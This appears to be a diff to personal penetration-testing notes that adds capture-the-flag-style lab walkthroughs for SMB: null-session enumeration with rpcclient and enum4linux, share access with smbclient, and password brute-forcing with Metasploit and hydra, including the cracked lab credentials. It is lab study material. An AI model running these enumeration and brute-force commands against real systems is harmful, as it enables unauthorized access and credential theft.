@@ -616,7 +616,7 @@ $ smbmap -u {user} -p {password} -d . -H {target} --upload '/path/to/file' '{sha
 # Download a file
 $ smbmap -u {user} -p {password} -d . -H {target} --download '{share}$\megacorp_passwords.txt'
 # Delete a file
-$ smbmap -u {user} -p {password} -d . -H {target} --download '{share}$\ultra_hidden_backdoor.exe'
+$ smbmap -u {user} -p {password} -d . -H {target} --delete '{share}$\ultra_hidden_backdoor.exe'
 ```
 
 ### Windows Recon: smbmap
@@ -645,10 +645,189 @@ things manually.
 $ nmap -sV -O -A [TARGET] 
 $ nmap -p445 [TARGET] --script smb-os-discovery
 $ msfconsole
-> use auxiliary/scanner/smb/smb-version
-auxiliary > set RHOSTS [TARGET]
-auxiliary > run
+msf5 > use auxiliary/scanner/smb/smb-version
+msf5 auxiliary > set RHOSTS [TARGET]
+msf5 auxiliary > run
 $ nmblookup -A [TARGET]
 $ smbclient -L [TARGET] -N
-$ rcpclient -U "" -N [TARGEt]
+$ rpcclient -U "" -N [TARGEt]
 ```
+
+### SMB: Samba 1 Lab
+
+Objective: Find the Netbios-ssn workgroup of the server.
+
+```bash
+$ nmap -sV -A -T4 $target
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
+```
+
+## SMB: Samba 2 
+
+```bash
+# Start a null session.
+$ rcpclient -U "" -N [TARGET]
+# Get server info from share.
+> srvinfo
+# For OS enumeration
+$ enum4linux -o [TARGET]
+msf5 > use auxiliary/scanner/smb/smb2 
+msf5 auxiliary > set RHOSTS [TARGET]
+$ enum4linux -U [TARGET]
+$ rpcclient -U "" -N [target]
+rpcclient > enumdomusers 
+rpcclient > lookupnames [USER]
+```
+
+### SMB: Samba 2 Lab
+
+Objective: find the admin SID.
+
+```bash
+$ nmap -sV -A -T4 --script smb-enum-users,smb-enum-shares $target 
+[\/ SNIP \/]
+| smb-enum-shares: 
+|   account_used: guest
+|   \\192.106.16.3\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (samba.recon.lab)
+|     Users: 2
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+[\/ SNIP \/]
+| smb-enum-users: 
+|   SAMBA-RECON\admin (RID: 1005)
+|     Full name:   
+|     Description: 
+|     Flags:       Normal user account
+[\/ SNIP \/]
+# Given this information, we can use rpcclient with a null session to look up names.
+$ rpcclient -U "" -N $target
+rpcclient > lookupnames admin
+admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
+```
+
+## SMB: Samba 3
+
+```bash
+msf5 > use auxiliary/scanner/smb/smb-enumshares
+msf5 auxiliary > set RHOSTS [TARGEt]
+$ enum4linux -S [TARGET]
+$ enum4linux -G [TARGET]
+$ enum4linux -i [TARGET]
+$ rpcclient -U "" -N [TARGEt]
+rpcclient $> enumdomgroups
+```
+
+### SMB: Samba 3 Lab
+
+Objective: get teh flag!11!
+
+```bash
+$ nmap -sV -A -T4 $target
+# We find 445 and 139 open, as it's the SMB target.
+$ nmap -sV -A -T4 $target --script smb-enum-shares
+[\/ SNIP \/]
+| smb-enum-shares: 
+|   account_used: guest
+|   \\192.252.68.3\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (samba.recon.lab)
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+[\/ SNIP \/]
+# If the info is correct, a NULL session might be possible to use.
+$ rpcclient -U "" -N $target
+rpcclient $> enumdomgroups
+group:[Maintainer] rid:[0x3ee]
+group:[Reserved] rid:[0x3ef]
+rpcclient $> enumdomusers 
+user:[john] rid:[0x3e8]
+user:[elie] rid:[0x3ea]
+user:[aisha] rid:[0x3ec]
+user:[shawn] rid:[0x3e9]
+user:[emma] rid:[0x3eb]
+user:[admin] rid:[0x3ed]
+# Nice, we have a NULL session. Let's connect to the share 
+# via smbclient.
+$ smbclient -L -N //$target/public
+smb: \> dir 
+  secret                              D        0  Tue Nov 27 13:36:13 2018
+smb: \> cd secret
+smb: \secret\> dir
+  flag                                N       33  Tue Nov 27 13:36:13 2018
+smb: \secret\> get flag
+# This will download the flag. Outside smbclient, we can open it
+# using the cat command.
+```
+
+## SMB Dictionary Attack
+
+```bash
+msf5 > use auxiliary/scanner/smb/smb-login
+msf5 auxiliary > set RHOSTS [TARGET]
+msf5 auxiliary > set pass_file /path/to/wordlists
+msf5 auxiliary > set smbuser [USER]
+$ gzip -d /usr/share/wordlists/rockyou.txt.gz # RockYou on Kali.
+$ hydra -l [USER] -P /usr/share/wordlists/rockyou.txt [TARGET] [PROTOCOL] # In this case it'd be smb.m
+msf5 > use auxiliary/scanner/smb/pipe-auditor
+msf5 auxiliary > set smbuser [USER]
+msf5 auxiliary > set smbpass [PASSWORD]
+msf5 auxiliary > set RHOSTS [TARGET]
+$ enum4linux -r -U [USER] -p [PASSWORD] [TARGET]
+```
+
+### SMB Dictionary Attack Lab
+
+Objective: get da root flag! Crack into Jane's and Admin's accounts, although no password
+was provided...
+
+```bash
+$ msfconsole
+msf5 > use auxiliary/scanner/smb/smb_login
+msf5 auxiliary > set smbuser Jane
+msf5 auxiliary > set rhosts $target
+msf5 auxiliary > set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+msf5 auxiliary > run
+# We get a hit on .\jane:safepass. So we'll use that later.
+$ gzip -d /usr/share/wordlists/rockyou.txt.gz
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt $target smb
+[445][smb] host: 192.122.87.3   login: admin   password: p4ssw0rd
+# Sweet, we got a hit! Let's try to enumerate shares with our new creds.
+$ smbclient -L -U admin $target
+        Sharename       Type      Comment
+        ---------       ----      -------
+        shawn           Disk      
+        nancy           Disk      
+        admin           Disk      
+        IPC$            IPC       IPC Service (brute.samba.recon.lab)
+# The output is the same if we run it with the jane user,
+# so let's try to connect into jane's share.
+$ smbclient -U jane //$target/jane
+smb: \> dir
+  flag                                D        0  Tue Nov 27 19:25:12 2018
+  admin                               D        0  Tue Nov 27 19:25:12 2018
+# There's a flag directory, let's cd into it. There's also an admin folder...
+# maybe it contains some serious corpo creds!
+smb: \> cd flag
+smb: \flag\> dir
+  flag                                N       33  Tue Nov 27 19:25:12 2018
+smb: \flag\> get flag
+# Although this flag is useless to us, it's good to keep practicing with the smbclient.
+# Now let's get da root flag!!!!
+$ smbclient -U admin //$target/admin
+smb: \> dir
+  hidden                              D        0  Tue Nov 27 19:25:12 2018
+smb: \> cd hidden
+smb: \hidden\> dir
+  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018
+smb: \hidden\> get flag.tar.gz
+$ tar xfv flag.tar.gz
+```
+
+And we're good to go.
